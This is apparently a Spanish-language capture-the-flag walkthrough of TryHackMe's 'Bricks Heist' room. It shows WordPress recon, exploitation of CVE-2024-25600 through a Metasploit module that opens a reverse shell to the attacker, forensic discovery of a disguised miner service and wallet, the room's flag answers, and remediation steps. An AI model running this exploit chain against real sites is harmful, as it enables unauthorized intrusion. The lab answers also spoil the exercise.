# 🛠️ Walkthrough Técnico - Bricks Heist

| Información | Detalle |
|-------------|---------|
| **Autor** | Javier |
| **Fecha** | 10/03/2026 |
| **Plataforma** | TryHackMe |
| **Dificultad** | Principiante/Intermedio |
| **Tiempo Estimado** | 2 horas |

---

## 📋 Índice

1. [Fase 0: Configuración Inicial](#fase-0-configuración-inicial-)
2. [Fase 1: Reconocimiento](#fase-1-reconocimiento-recon-)
3. [Fase 2: Explotación](#fase-2-explotación-)
4. [Fase 3: Post-Explotación y Forense](#fase-3-post-explotación-y-forense-)
5. [Fase 4: Remediación](#fase-4-remediación-bonus-)
6. [Herramientas Utilizadas](#herramientas-utilizadas)

---

## Fase 0: Configuración Inicial 🔧

### 1. Configurar el host

```bash
# Editar archivo de hosts
sudo nano /etc/hosts
# Agregar línea:
10.x.x.x bricks.thm
```

### 2. Verificar conectividad

```bash
ping -c 3 bricks.thm
```

---

## Fase 1: Reconocimiento (Recon) 🔍

### 3. Escaneo de puertos con Nmap

```bash
nmap -sC -sV -oN escaneo_inicial.txt bricks.thm
```

**Resultado clave:** puerto 443 (HTTPS) abierto → WordPress detectado.

### 4. Enumeración de WordPress con WPScan

```bash
wpscan --url https://bricks.thm --enumerate p,t,u --disable-tls-checks
```

**Hallazgo crítico:**

```
WordPress theme in use: bricks
Version: 1.9.5 (80% confidence)
```

### 5. Investigación de vulnerabilidades

Búsqueda de CVE para Bricks Builder 1.9.5 → **CVE-2024-25600**, RCE no autenticada (CVSS 9.8).

---

## Fase 2: Explotación 💣

### 6. Ejecutar el exploit (Metasploit)

```
msfconsole
search wp_bricks_builder_rce
use exploit/multi/http/wp_bricks_builder_rce

set RHOSTS bricks.thm
set RPORT 443
set TARGETURI /
set LHOST <TU_IP>
set LPORT 4444
set AutoCheck false
set ForceExploit true
set SSL true

exploit
```

### 7. Verificar acceso

```bash
# En Meterpreter (shell):
whoami
id
pwd
```

**Confirmación:** shell obtenida como usuario `www-data`.

---

## Fase 3: Post-Explotación y Forense 🔍

### 8. Buscar archivo .txt oculto (Pregunta 1)

```
# En Meterpreter:
ls -la /var/www/html/
# O buscar específicamente:
search -f *.txt -d /var/www
```

**Hallazgo:** `650c844110baced87e1606453b93f22a.txt`

```bash
cat /data/www/default/650c844110baced87e1606453b93f22a.txt
```

✅ **Respuesta 1:** `THM{fl46_650c844110baced87e1606453b93f22a}`

### 9. Listar procesos (Pregunta 2)

```
ps
```

**Análisis** — buscar procesos sospechosos:

- Nombres que imitan procesos del sistema
- Rutas en `/lib/NetworkManager/`

**Hallazgo:** proceso `nm-inet-dialog` en `/lib/NetworkManager/`.

✅ **Respuesta 2:** `nm-inet-dialog`

### 10. Identificar el servicio de persistencia (Pregunta 3)

```bash
ls /etc/systemd/system/
cat /etc/systemd/system/ubuntu.service
```

**Contenido encontrado:**

```ini
[Unit]
Description=TRYHACK3M

[Service]
Type=simple
ExecStart=/lib/NetworkManager/nm-inet-dialog
Restart=on-failure

[Install]
WantedBy=multi-user.target
```

✅ **Respuesta 3:** `ubuntu` (archivo `ubuntu.service`)

### 11. Encontrar el log del minero (Pregunta 4)

```bash
ls -la /lib/NetworkManager/
cat /lib/NetworkManager/inet.conf
```

**Hallazgo:** `inet.conf` contiene logs del minero con entradas como:

```
[*] Status: Mining!
[*] Bitcoin Miner Thread Started
```

✅ **Respuesta 4:** `inet.conf`

### 12. Extraer la wallet (Pregunta 5)

En `inet.conf` aparece la cadena codificada:

```
ID: 5757314e65474e5962484a4f656d787457544e424e574648555446684d3070735930684b616c70555a7a566b52335276546b686b65575248647a525a57466f77546b64334d6b347a526d685a6255313459316873636b35366247315a4d304531595564476130355864486c6157454a3557544a564e453959556e4a685246497a5932355363303948526a4a6b52464a7a546d706b65466c525054303d
```

Decodificación en Kali (primero de hex a bytes, después Base64):

```bash
echo "5757314e..." | xxd -r -p | base64 -d
```

✅ **Respuesta 5:** `bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa`

### 13. Identificar el grupo de amenaza (Pregunta 6) — OSINT

Búsqueda de la wallet en:

1. Buscador: `"<wallet_address>" threat group`
2. VirusTotal
3. Exploradores de blockchain (Blockchain.com)
4. Informes de seguridad (CrowdStrike, Mandiant, SecureList)

✅ **Respuesta 6:** LockBit

---

## Fase 4: Remediación (Bonus) 🔐

### 14. Contención inmediata

```bash
# Detener y deshabilitar el servicio malicioso
systemctl stop ubuntu.service
systemctl disable ubuntu.service

# Matar procesos activos
pkill -f nm-inet-dialog

# Eliminar servicio, binario y configuración del minero
rm /etc/systemd/system/ubuntu.service
systemctl daemon-reload
rm /lib/NetworkManager/nm-inet-dialog
rm /lib/NetworkManager/inet.conf
```

### 15. Parcheo de vulnerabilidades

```bash
# Actualizar Bricks Builder desde WordPress Admin, o manualmente:
cd /data/www/default/wp-content/themes/
rm -rf bricks/
# Descargar e instalar versión 1.9.6.1+

# Corregir permisos de wp-config.php
chmod 640 /data/www/default/wp-config.php
chown www-data:www-data /data/www/default/wp-config.php
```

Restringir phpMyAdmin o eliminar el acceso público.

### 16. Hardening post-incidente

- Rotar todas las credenciales
- Implementar WAF
- Configurar monitorización de integridad (AIDE/Tripwire)
- Establecer alertas para procesos con alto consumo de CPU
- Revisar logs de autenticación: `/var/log/auth.log`

---

## Herramientas Utilizadas

- Nmap
- WPScan
- SearchSploit
- Metasploit
